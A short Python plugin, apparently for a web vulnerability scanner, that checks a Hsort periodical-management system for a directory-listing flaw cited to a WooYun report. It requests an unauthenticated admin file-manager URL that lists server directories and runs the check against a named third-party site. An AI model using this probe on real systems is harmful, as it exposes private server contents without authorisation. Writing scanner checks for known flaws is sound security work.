#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 头晕脑壳疼
#_PlugName_ = Hsort报刊管理目录遍历
#references = http://www.wooyun.org/bugs/wooyun-2010-0141440
#捡个现成的



def assign(service, arg):
    if service == "hsort":
        return True, arg

def audit(arg):
    target = "Admin/fileManage.aspx?action=LIST&value1=~%2Fadmin%2F&value2="
    url=arg+target
    code, head,res, errcode, _   = curl.curl2(url)
    if code == 200 and '"LastModify":' in res:
        security_hole(url)
        
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('hsort','http://www.aheca.cn:8080/')[1])